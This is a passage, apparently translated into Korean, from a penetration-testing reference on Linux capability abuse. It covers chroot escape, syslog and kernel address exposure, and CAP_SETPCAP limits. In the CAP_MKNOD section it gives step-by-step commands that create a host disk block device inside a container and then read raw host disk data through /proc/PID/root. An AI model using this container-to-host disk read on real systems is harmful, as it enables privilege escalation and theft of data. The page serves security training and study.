f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
> [!NOTE]
> 일반적으로 이 불변 속성은 다음을 사용하여 설정 및 제거됩니다:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 `chroot(2)` 시스템 호출의 실행을 가능하게 하며, 이는 알려진 취약점을 통해 `chroot(2)` 환경에서 탈출할 수 있게 할 수 있습니다:

- [다양한 chroot 솔루션에서 탈출하는 방법](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [chw00t: chroot 탈출 도구](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 특정 하드웨어 플랫폼에 맞춘 `LINUX_REBOOT_CMD_RESTART2`와 같은 특정 명령을 포함하여 시스템 재시작을 위한 `reboot(2)` 시스템 호출의 실행을 허용할 뿐만 아니라, `kexec_load(2)` 및 Linux 3.17 이후부터는 새로운 또는 서명된 크래시 커널을 로드하기 위한 `kexec_file_load(2)`의 사용을 가능하게 합니다.

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 Linux 2.6.37에서 더 넓은 **CAP_SYS_ADMIN**에서 분리되어 `syslog(2)` 호출을 사용할 수 있는 능력을 부여합니다. 이 기능은 `kptr_restrict` 설정이 1일 때 `/proc` 및 유사한 인터페이스를 통해 커널 주소를 볼 수 있게 합니다. Linux 2.6.39 이후로 `kptr_restrict`의 기본값은 0이며, 이는 커널 주소가 노출됨을 의미하지만, 많은 배포판은 보안상의 이유로 이를 1(주소를 uid 0을 제외하고 숨김) 또는 2(항상 주소 숨김)로 설정합니다.

또한, **CAP_SYSLOG**는 `dmesg_restrict`가 1로 설정된 경우 `dmesg` 출력을 접근할 수 있게 합니다. 이러한 변화에도 불구하고, **CAP_SYS_ADMIN**은 역사적 선례로 인해 `syslog` 작업을 수행할 수 있는 능력을 유지합니다.

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 정규 파일, FIFO(이름이 있는 파이프) 또는 UNIX 도메인 소켓을 생성하는 것을 넘어 `mknod` 시스템 호출의 기능을 확장합니다. 이는 특별한 파일의 생성을 허용하며, 여기에는 다음이 포함됩니다:

- **S_IFCHR**: 터미널과 같은 장치인 문자 특별 파일.
- **S_IFBLK**: 디스크와 같은 장치인 블록 특별 파일.

이 기능은 장치 파일을 생성할 수 있는 능력이 필요한 프로세스에 필수적이며, 문자 또는 블록 장치를 통해 직접 하드웨어와 상호작용할 수 있게 합니다.

이는 기본 도커 기능입니다 ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

이 기능은 다음 조건에서 호스트에서 권한 상승(전체 디스크 읽기)을 허용합니다:

1. 호스트에 대한 초기 접근 권한이 있음 (비특권).
2. 컨테이너에 대한 초기 접근 권한이 있음 (특권 (EUID 0), 및 유효한 `CAP_MKNOD`).
3. 호스트와 컨테이너는 동일한 사용자 네임스페이스를 공유해야 합니다.

**컨테이너에서 블록 장치를 생성하고 접근하는 단계:**

1. **호스트에서 표준 사용자로:**

- `id`로 현재 사용자 ID를 확인합니다, 예: `uid=1000(standarduser)`.
- 대상 장치를 식별합니다, 예: `/dev/sdb`.

2. **컨테이너 내부에서 `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **호스트로 돌아가기:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
이 접근 방식은 표준 사용자가 `/dev/sdb`에서 데이터를 접근하고 잠재적으로 읽을 수 있도록 하며, 공유 사용자 네임스페이스와 장치에 설정된 권한을 악용합니다.

### CAP_SETPCAP

**CAP_SETPCAP**는 프로세스가 다른 프로세스의 **능력 집합을 변경**할 수 있게 하여, 유효한, 상속 가능한 및 허용된 집합에서 능력을 추가하거나 제거할 수 있도록 합니다. 그러나 프로세스는 자신의 허용된 집합에서 보유한 능력만 수정할 수 있어, 다른 프로세스의 권한을 자신의 권한 이상으로 상승시킬 수 없습니다. 최근 커널 업데이트는 이러한 규칙을 강화하여 `CAP_SETPCAP`가 자신의 또는 자식 프로세스의 허용된 집합 내에서만 능력을 줄일 수 있도록 제한하였습니다. 이는 보안 위험을 완화하기 위한 목적입니다. 사용하려면 유효한 집합에 `CAP_SETPCAP`가 있어야 하며, 수정할 대상 능력이 허용된 집합에 있어야 하며, `capset()`을 사용하여 수정합니다. 이는 `CAP_SETPCAP`의 핵심 기능과 제한 사항을 요약하며, 권한 관리 및 보안 강화에서의 역할을 강조합니다.

**`CAP_SETPCAP`**는 프로세스가 **다른 프로세스의 능력 집합을 수정**할 수 있게 해주는 리눅스 능력입니다. 이는 다른 프로세스의 유효한, 상속 가능한 및 허용된 능력 집합에서 능력을 추가하거나 제거할 수 있는 능력을 부여합니다. 그러나 이 능력을 사용하는 데에는 특정 제한이 있습니다.

`CAP_SETPCAP`를 가진 프로세스는 **자신의 허용된 능력 집합에 있는 능력만 부여하거나 제거할 수 있습니다**. 즉, 프로세스가 자신이 보유하지 않은 능력을 다른 프로세스에 부여할 수 없습니다. 이 제한은 프로세스가 다른 프로세스의 권한을 자신의 권한 수준 이상으로 상승시키는 것을 방지합니다.

게다가, 최근 커널 버전에서는 `CAP_SETPCAP` 능력이 **더욱 제한되었습니다**. 이제 프로세스가 다른 프로세스의 능력 집합을 임의로 수정할 수 없으며, **오직 자신의 허용된 능력 집합이나 자식 프로세스의 허용된 능력 집합에서 능력을 줄이는 것만 허용됩니다**. 이 변경은 능력과 관련된 잠재적 보안 위험을 줄이기 위해 도입되었습니다.

`CAP_SETPCAP`를 효과적으로 사용하려면, 유효한 능력 집합에 이 능력이 있어야 하며, 대상 능력이 허용된 능력 집합에 있어야 합니다. 그런 다음 `capset()` 시스템 호출을 사용하여 다른 프로세스의 능력 집합을 수정할 수 있습니다.

요약하자면, `CAP_SETPCAP`는 프로세스가 다른 프로세스의 능력 집합을 수정할 수 있게 하지만, 자신이 보유하지 않은 능력을 부여할 수는 없습니다. 또한 보안 문제로 인해 최근 커널 버전에서는 자신의 허용된 능력 집합이나 자식 프로세스의 허용된 능력 집합에서 능력을 줄이는 것만 허용하도록 기능이 제한되었습니다.

## References

**이 예제의 대부분은** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com) **의 일부 실험실에서 가져온 것입니다. 따라서 이 privesc 기술을 연습하고 싶다면 이 실험실을 추천합니다.**

**기타 참고자료**:

- [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
- [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​
{{#include ../../banners/hacktricks-training.md}}
